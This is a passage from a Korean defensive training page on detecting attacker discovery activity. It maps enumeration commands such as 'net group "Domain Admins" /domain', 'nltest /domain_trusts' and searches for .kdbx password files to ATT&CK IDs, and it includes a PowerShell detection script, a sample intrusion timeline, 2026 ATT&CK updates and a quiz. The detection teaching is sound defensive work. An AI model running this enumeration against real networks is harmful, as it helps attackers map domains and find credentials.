| 네트워크 설정, 도메인 컨트롤러 | `ipconfig /all`, `route print`, `nltest /dclist:` | T1016 System Network Configuration Discovery |
| 도메인 신뢰 관계 | `nltest /domain_trusts` | T1482 Domain Trust Discovery |
| 실행 중인 프로세스 / 보안 도구 | `tasklist /v`, `ps aux` | T1057 Process Discovery, T1518.001 Security Software Discovery |
| 연결과 듣는 서비스 | `netstat -ano`, `ss -tunap` | T1049 System Network Connections Discovery |
| 서비스 | `sc query`, `systemctl list-units` | T1007 System Service Discovery |
| 파일과 폴더 | `dir /s /b *.xlsx`, `tree`, `find / -name "*.kdbx"` | T1083 File and Directory Discovery |
| 공유 폴더 | `net view \\SRV-FILE-0003`, `net share` | T1135 Network Share Discovery |
| 다른 호스트 | `net view`, `arp -a`, 핑 훑기 | T1018 Remote System Discovery |
| 설치된 소프트웨어 | `wmic product get name`(사용 중단 예정), 레지스트리 Uninstall 키 | T1518 Software Discovery |

### 환경 속에 숨어 살기 — 왜 잡기 어려운가 { #lotl }

이미 그 기계에 있는 도구를 쓰는 걸 <strong>환경 속에 숨어 살기(living off the land)</strong>라고 합니다. 공격자가 좋아하는 이유는 이렇습니다.

- <strong>새 파일을 떨구지 않습니다</strong> — 백신이 검사할 파일이 없고, 실행 파일은 Microsoft 서명이 붙어 있습니다.
- <strong>섞여 듭니다</strong> — 관리자, 헬프데스크 스크립트, 자산 관리 에이전트, 설치 프로그램이 하루 종일 `whoami`, `ipconfig`, `net`, `tasklist`를 돌립니다.
- <strong>명령마다 알림을 걸면 SOC가 잠깁니다.</strong> PC 5,000대에 "`whoami` 실행 시 알림" 규칙을 걸면 하루에 오탐이 수천 건 나오고, 결국 규칙이 꺼집니다. 그래서 많은 환경에서 정보 탐색은 아무 방해 없이 진행됩니다.

공격자가 무엇을 알게 되는지, 명령 하나와 그 출력을 보겠습니다.

```
C:\> net group "Domain Admins" /domain
The request will be processed at a domain controller for domain corp.example.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            adm.lee                  svc_backup
The command completed successfully.
```

- `net group "<이름>" /domain` — <strong>도메인 컨트롤러</strong>에 도메인 그룹의 구성원을 물어봅니다.
- `Members` — 공격자는 이제 훔칠 가치가 있는 계정 세 개를 압니다. `svc_backup`에 주목하세요. <strong>Domain Admins에 들어 있는 서비스 계정</strong>은 고전적인 약점입니다(비밀번호가 오래됐고 스크립트에 적혀 있는 경우가 많음). 다음 단계(자격 증명 접근, 옆으로 이동)는 바로 이 이름들을 노립니다.

### 정보 탐색 잡기: 몰아치는 패턴을 봅니다 { #discovery-detect }

명령 하나는 소음이니, <strong>패턴</strong>을 잡습니다. <strong>한 부모 프로세스나 한 계정</strong>에서, <strong>몇 분 안에</strong>, <strong>서로 다른</strong> 정보 탐색 명령이 여러 개 나오는 것입니다. 임플란트가 뜬 뒤 `LT-FIN-0117`의 4688(또는 Sysmon 1)은 이렇게 보입니다.

```
07:45:02  CORP\p.nguyen  parent=odsync.exe  whoami.exe /all
07:45:04  CORP\p.nguyen  parent=odsync.exe  ipconfig.exe /all
07:45:07  CORP\p.nguyen  parent=odsync.exe  net.exe user p.nguyen /domain
07:45:11  CORP\p.nguyen  parent=odsync.exe  net.exe group "Domain Admins" /domain
07:45:15  CORP\p.nguyen  parent=odsync.exe  nltest.exe /dclist:corp.example
07:45:19  CORP\p.nguyen  parent=odsync.exe  nltest.exe /domain_trusts
07:45:26  CORP\p.nguyen  parent=odsync.exe  tasklist.exe /v
07:45:31  CORP\p.nguyen  parent=odsync.exe  netstat.exe -ano
07:45:40  CORP\p.nguyen  parent=odsync.exe  cmd.exe /c dir /s /b \\SRV-FILE-0003\finance\*.xlsx
```

분석가 눈으로 읽어 보면:

- <strong>38초 안에 서로 다른 정보 탐색 명령 아홉 개</strong> — 사람이 이렇게 빠르고 체계적으로 치지는 않습니다. 스크립트이거나, 체크리스트를 보며 일하는 운영자입니다.
- <strong>부모가 모두 `odsync.exe`</strong> — `AppData`에 있는 정체불명 프로그램(위 Run 키의 그것)이 관리 명령을 돌리고 있습니다. 정상 관리 도구는 부모가 알려져 있습니다(사람이 프롬프트에서 치면 `explorer.exe` → `cmd.exe`, 아니면 알려진 관리 에이전트).
- <strong>같은 사용자, 그것도 재무팀 사용자</strong> — 재무팀 직원은 보통 `nltest /domain_trusts`를 치지 않습니다.
- <strong>순서가 이야기를 해 줍니다</strong>: 나는 누구 → 어떤 네트워크 → 내 계정은 → 관리자는 누구 → DC는 어디 → 어떤 신뢰 관계 → 어떤 보안 소프트웨어가 돌고 있나 → 어떤 연결 → 스프레드시트는 어디. 즉 T1033 → T1016 → T1087.002 → T1069.002 → T1018/T1482 → T1057/T1518.001 → T1049 → T1083/T1135입니다.

호스트 한 대의 Security 로그에서 이 패턴을 찾는 간단한 PowerShell입니다.

```powershell
$disc = 'whoami.exe','net.exe','net1.exe','nltest.exe','ipconfig.exe','systeminfo.exe','tasklist.exe','netstat.exe','quser.exe','arp.exe'
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-24)} |
  ForEach-Object { $x=[xml]$_.ToXml(); $d=@{}; $x.Event.EventData.Data | % { $d[$_.Name]=$_.'#text' }
    [pscustomobject]@{Time=$_.TimeCreated; Parent=$d.ParentProcessName; Child=Split-Path $d.NewProcessName -Leaf} } |
  Where-Object { $disc -contains $_.Child } |
  Group-Object Parent | Where-Object { ($_.Group.Child | Sort-Object -Unique).Count -ge 4 } |
  Select-Object Count, Name, @{n='Commands';e={($_.Group.Child | Sort-Object -Unique) -join ','}}
```

한 줄씩 보면:

1. `$disc = …` — 지켜볼 흔한 정보 탐색 실행 파일 목록(`net1.exe`는 `net.exe`가 일부 하위 명령에서 실제로 부르는 파일입니다).
2. `Get-WinEvent -FilterHashtable @{…}` — Security 로그에서 최근 24시간의 4688 이벤트만 읽습니다(해시테이블 필터는 Windows가 먼저 걸러 주기 때문에 빠릅니다).
3. `ForEach-Object { $x=[xml]$_.ToXml() … }` — 이벤트 하나하나를 XML로 바꾸고 `EventData` 필드를 해시테이블 `$d`에 옮겨 담아, `$d.ParentProcessName`처럼 이름으로 꺼낼 수 있게 합니다.
4. `[pscustomobject]@{…}` — 시간, 부모 경로, 자식 파일 이름만 남깁니다(`Split-Path -Leaf`가 `C:\Windows\System32\` 부분을 잘라 냅니다).
5. `Where-Object { $disc -contains $_.Child }` — 정보 탐색 실행 파일만 남깁니다.
6. `Group-Object Parent` — 부모 프로세스별로 묶고, `Where-Object { … -ge 4 }`로 <strong>서로 다른</strong> 탐색 도구를 <strong>네 개 이상</strong> 돌린 부모만 남깁니다.
7. `Select-Object …` — 개수, 부모, 서로 다른 도구 목록을 출력합니다.

출력:

```
Count Name                                                     Commands
----- ----                                                     --------
   14 C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe arp.exe,ipconfig.exe,net.exe,netstat.exe,nltest.exe,tasklist.exe,whoami.exe
    6 C:\Program Files\InventoryAgent\invagent.exe             ipconfig.exe,systeminfo.exe,netstat.exe,whoami.exe
```

두 번째 줄은 알려진 자산 관리 에이전트입니다. 확인한 뒤 기준선(예외 목록)에 넣습니다. 첫 줄이 침투입니다. SIEM에서는 같은 논리를 모든 호스트에 걸쳐 만듭니다. <strong>짧은 시간 창 안에서, 호스트별·부모(또는 사용자)별로 서로 다른 정보 탐색 명령의 개수를 세고, 기준치를 넘으면 알림, 알려진 도구는 제외</strong>.

!!! tip "[보충] 그 밖에 갖춰 둘 만한 정보 탐색 신호"
    - <strong>워크스테이션에서 나가는 도메인 전체 조회</strong>: `net group … /domain`, `nltest /dclist`, `nltest /domain_trusts`는 일반 사용자 PC에서 드뭅니다.
    - <strong>AD 열람 도구</strong>(BloodHound 수집기, AdFind, PowerView류 스크립트)는 도메인 컨트롤러에 <strong>LDAP 질의</strong>를 몰아서 보냅니다. DC의 EDR, LDAP 질의 로깅, 또는 "아무도 조회할 일이 없는" 미끼 계정(honeytoken)으로 잡을 수 있습니다.
    - <strong>서비스 계정이 사람처럼 움직임</strong> — SQL이나 웹 서비스 신원이 `net user /domain`을 돌리는 건 거의 정상일 리 없습니다.
    - <strong>리눅스</strong>: 웹 서버 사용자(`www-data`)로 `id; uname -a; cat /etc/passwd; sudo -l; ps aux; ss -tunap`이 연달아 나오는 것 — 뒤의 auditd·프로세스 생성 페이지에서 다룹니다.

## 한데 모아 보기: 처음 5분 { #timeline }

| 시각 | 무슨 일 | 전술 / 기법 | 증거 |
| --- | --- | --- | --- |
| 07:41:58 | Word가 매크로 문서를 열고 숨긴 PowerShell 실행 | 실행, T1204.002 → T1059.001 | Sysmon 1, 4688, 4104 |
| 07:42:30 | PowerShell이 `odsync.exe`를 `AppData\Roaming`에 내려받음 | 명령·제어, T1105 | Sysmon 3, Sysmon 11, 프록시 로그 |
| 07:43:05 | Run 키 `OneDriveSync` 생성 | 지속성, T1547.001 | Sysmon 13 |
| 07:43:50 | 임플란트를 다시 받는 한 시간 간격 숨김 작업 생성 | 지속성, T1053.005 | 4698 |
| 07:45:02–40 | `odsync.exe`에서 정보 탐색 명령 아홉 개 | 정보 탐색, T1033/T1087/T1069/T1482/T1083… | 4688 / Sysmon 1 몰아치기 |

5분, 세 개의 전술, 그리고 모든 단계가 기록을 남겼습니다 — 로깅이 켜져 있다면요. 방어 쪽 교훈: <strong>07:41(Office → PowerShell)이나 07:43(스크립트 실행기가 Run 키를 씀)에 울리는 경보가 07:45 경보보다 훨씬 싸고</strong>, 한 달 뒤에 발견하는 것보다는 비교할 수 없이 쌉니다.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효"
    이 페이지의 생각들은 그대로이고, 현대 탐지의 중심에 있습니다. ATT&CK은 여전히 SOC와 탐지 업체의 공통 언어이고, "규칙마다 기법 ID 붙이기"는 표준 관행입니다. 셸, 스크립트 실행기, `xp_cmdshell` 같은 환경 기능을 통한 실행은 여전히 공격자의 일상이고, DB 엔진이 셸을 띄우는 건 여전히 믿을 만한 탐지입니다. 지속성은 여전히 저울질이고, 여러 겹 지속성은 여전히 어설픈 정리를 이기며, Run 키·예약 작업·서비스가 여전히 가장 흔한 Windows 장치입니다. 정보 탐색은 여전히 기본 명령이 주류이고, EDR과 SIEM 탐지 콘텐츠는 몰아치기·순서 탐지로 이걸 잡습니다.

!!! info "[변경됨] 바뀐 점"
    - <strong>ATT&CK 구조가 바뀌었습니다.</strong> <strong>v19(2026년 4월)</strong>에서 옛 *Defense Evasion* 전술이 <strong>둘로 나뉘었습니다</strong>. <strong>Stealth(은신)</strong>가 ID **TA0005**를 이어받고(섞여 들기, 위장, 난독화, LOLBin), 새 <strong>Defense Impairment(방어 무력화, TA0112)</strong>가 보안 도구와 로깅을 망가뜨리는 행동을 맡습니다. 옛 **T1562 Impair Defenses** 기법은 폐기되고 하위 기법들이 새 ID로 다시 나왔습니다(예: **T1685 Disable or Modify Tools**). 그 전에 v18(2025년 말)은 데이터 소스를 <strong>탐지 전략(detection strategy)과 분석(analytics)</strong>으로 바꿨고, <strong>v20(2026년 10월)</strong>도 내용을 계속 추가했습니다(AI 관련 악용 포함). 이 페이지에서 쓴 실행·지속성·정보 탐색 기법 번호는 v19에서 바뀌지 않았습니다.
    - <strong>Meterpreter 너머의 C2.</strong> Meterpreter는 아직 쓰이지만, 실제 침투에서는 다른 C2 프레임워크(Cobalt Strike 같은 상용, Sliver·Havoc 같은 오픈소스)를 더 자주 쓰거나, 아예 자작 임플란트 없이 원격 지원 에이전트 같은 <strong>정상 원격 관리(RMM) 도구</strong>를 실행과 지속성 수단으로 씁니다(ATT&CK T1219 Remote Access Tools). 서명된 정상 소프트웨어라 막기도, 이상하다고 표시하기도 더 어렵습니다.
    - <strong>지속성이 신원과 클라우드로도 옮겨 갔습니다.</strong> 하이브리드 환경에서 공격자는 <strong>MFA 수단 추가, OAuth 앱 동의, 앱 등록 자격 증명, 메일 자동 전달 규칙</strong>, 페더레이션 신뢰로 버팁니다. 이건 Windows 호스트를 전혀 건드리지 않습니다. 지속성 사냥에 신원 공급자(IdP) 감사 로그를 반드시 넣어야 합니다.
    - <strong>속도.</strong> 랜섬웨어 운영자들은 이제 접근 후 몇 분 안에 정보 탐색 체크리스트 전체(그리고 AD 수집)를 끝내는 경우가 많아서, 정보 탐색 탐지는 거의 실시간으로 울려야 합니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - <strong>정보 탐색 명령 하나에 알림을 걸지 마세요.</strong> 대기열이 넘치고 규칙이 꺼집니다. 몰아치기, 낯선 부모, 낯선 계정을 잡으세요.
    - <strong>지속성 장치 하나 지우고 사건을 닫지 마세요.</strong> 흔한 종류(Run 키, 시작프로그램 폴더, 작업, 서비스, WMI, 계정, RMM 도구, 신원 쪽 지속성)를 모두 훑거나, 다시 설치하세요.
    - <strong>규칙 매핑을 점검하세요.</strong> 아직 "Defense Evasion"이나 T1562로 태그된 규칙과 대시보드는 Stealth / Defense Impairment와 새 기법 ID로 다시 매핑해야 합니다. 안 그러면 커버리지 보고서가 틀립니다.
    - <strong>작업 때문에 `xp_cmdshell`을 "잠깐" 켰다가 잊지 마세요.</strong> SQL Server를 LocalSystem이나 도메인 관리자 계정으로 돌리지도 마세요. `xp_cmdshell`이 적힌 15457과 `sqlservr.exe`가 셸을 띄우는 것에 알림을 거세요.
    - <strong>감사 모드는 보호가 아닙니다.</strong> 많은 조직이 애플리케이션 제어를 몇 년째 감사 전용(8003/3076)으로 둡니다. 감사 이벤트는 좋은 관측 자료지만, 아무것도 막지 않습니다.

## 확인 문제 { #quiz }

### 문제 1

`SRV-SQL-0004`에서 2분 간격으로 다음이 보입니다. Application 로그 이벤트 15457 "Configuration option 'xp_cmdshell' changed from 0 to 1", 그다음 4688 `ParentProcessName = …\sqlservr.exe`, `CommandLine = "cmd.exe" /c net user /domain`, `TargetUserName = svc_sql`, `TargetDomainName = CORP`. 10분 뒤 또 15457 "from 1 to 0". 무슨 일이 일어났고, 어떤 전술이 관련되며, 계정이 왜 중요한가요?

??? success "정답과 해설"
    SQL Server에 `sysadmin` 권한을 가진 누군가(훔친 `sa` 비밀번호, 권한 높은 로그인으로 돌던 SQL 인젝션, 또는 뚫린 DBA 계정)가 <strong>`xp_cmdshell`을 켜고</strong>, 그걸로 <strong>SQL 인터프리터에서 빠져나와</strong> 진짜 Windows 셸을 얻었고(<strong>실행</strong>, SQL Server를 통한 T1059.003), <strong>`net user /domain`</strong>으로 도메인 계정을 나열했고(<strong>정보 탐색</strong>, T1087.002), 흔적을 숨기려고 <strong>다시 껐습니다</strong>. 켜기 → 쓰기 → 끄기 순서는 잊힌 유지 보수 작업이 아니라 사람이 직접 손으로 한 의도적 악용이라는 강한 신호입니다.

    <strong>계정이 중요한 이유</strong>는 그게 공격자가 OS에서 "된" 신원이기 때문입니다. `CORP\svc_sql`은 <strong>도메인</strong> 서비스 계정이라, 공격자는 이걸로 AD를 조회하고 다른 서버에도 닿을 수 있습니다. 이 계정 권한이 넓다면(또는 Domain Admins라면) 이미 도메인 수준 사고입니다. 다음 조치: `sysadmin`을 어떻게 얻었는지 찾고(SQL 로그인 기록, 앱의 인젝션), `svc_sql`을 재설정하고, 이 계정이 어디에 또 로그온했는지 보고, 그 셸이 무엇을 더 돌렸는지 사냥합니다.

### 문제 2

SOC가 백신 경보로 `odsync.exe`를 찾아 파일과 `OneDriveSync` Run 키를 지우고 사건을 닫았습니다. 두 시간 뒤 같은 노트북에서 같은 경보가 다시 울립니다. 가장 그럴듯한 이유는 무엇이고, 첫 사건을 어떻게 처리했어야 할까요?

??? success "정답과 해설"
    공격자가 <strong>여러 겹 지속성</strong>을 썼습니다. 가장 그럴듯한 건 <strong>예약 작업</strong>(4698 예시의 한 시간 간격 숨김 작업처럼)이 `odsync.exe`가 있는지 보고 없으면 <strong>다시 내려받는</strong> 것입니다. 그래서 파일과 Run 키를 지운 게 오히려 재다운로드를 부른 셈입니다. 다른 후보: 서비스, WMI 구독, 시작프로그램 폴더 항목, 공격자가 설치한 원격 관리 도구.

    올바른 처리: 지속성 장치 하나를 찾으면 <strong>더 있다고 가정</strong>합니다. 최초 감염 주변의 프로세스 나무와 타임라인을 봅니다(무엇이 파일을 만들었나? 그 프로세스가 또 무엇을 썼나 — Sysmon 11/13, 4698, 7045, 4720?). 흔한 자동 실행 위치를 모두 훑고(autoruns류 도구나 EDR 질의), 프록시 로그에서 다운로드 도메인을 다른 호스트도 접속했는지 찾고, <strong>모든</strong> 장치를 지운 뒤 한동안 지켜보거나 노트북을 <strong>다시 설치</strong>합니다. 그 기계에서 쓰인 자격 증명도 노출됐다고 봅니다.

### 문제 3

동료가 SIEM 규칙을 제안합니다. "`whoami.exe`, `net.exe`, `ipconfig.exe`가 실행될 때마다 알림." 왜 나쁜 규칙인지 설명하고, 대신 무엇을 제안하겠습니까? 정보 탐색을 의심스럽게 만드는 조건을 세 가지 이상 드세요.

??? success "정답과 해설"
    이 명령들은 관리자, 스크립트, 설치 프로그램, 자산 관리 에이전트가 끊임없이 돌리는 <strong>환경 속에 숨어 살기</strong> 도구입니다. PC 수천 대에서 하루 수천 번 울리고, 분석가는 무시하는 법을 배우고, 결국 규칙은 꺼집니다 — 그 소음 속에서 진짜 정보 탐색도 놓칩니다.

    더 나은 방법은 명령이 아니라 <strong>패턴</strong>을 잡는 것입니다. 예를 들어 한 호스트에서 <strong>같은 부모 프로세스나 같은 계정</strong>으로 <strong>몇 분 안에</strong> <strong>서로 다른 탐색 도구가 네 개 이상</strong> 돌면 알림, 기준선으로 확인된 관리 에이전트는 제외. 의심을 키우는 조건:

    - <strong>낯선 부모</strong> — `AppData`/`ProgramData`/`Temp`의 정체불명 실행 파일, Office, 웹 서버 작업 프로세스(`w3wp.exe`), DB 엔진(`sqlservr.exe`).
    - <strong>낯선 계정</strong> — 서비스 계정이나 IT가 아닌 사용자가 도메인 조회(`net group "Domain Admins" /domain`, `nltest /domain_trusts`)를 함.
    - <strong>속도와 순서</strong> — 몇 초 사이에 여러 명령이, 나는 누구 → 네트워크 → 계정 → 관리자 → DC → 신뢰 관계 순서로 나옴.
    - <strong>워크스테이션에서 나가는 도메인 전체 조회</strong>, 또는 DC로 몰리는 LDAP 질의.
    - 같은 호스트의 <strong>다른 경보 뒤에 이어지는</strong> 정보 탐색(Office → PowerShell, 새 Run 키) — 신호를 엮어서 봅니다.

## 관련 레퍼런스 { #related }

- [최초 침투](initial-exploitation.md) — 이 단계 바로 앞
- [지속성 — 서비스, 예약 작업, Run 키](../../../adversary/persistence.md) · [LOLBins](../../../adversary/lolbins.md) · [WMI와 WinRM 실행](../../../adversary/wmi-winrm.md)
- [PowerShell 다운로드 크래들](../../../adversary/powershell-cradles.md) · [방어 무력화와 로그 삭제](../../../adversary/impair-defenses-log-clearing.md)
- [Windows 이벤트 ID](../../../basics/windows-event-ids.md) · [리눅스 명령](../../../basics/linux-commands.md)
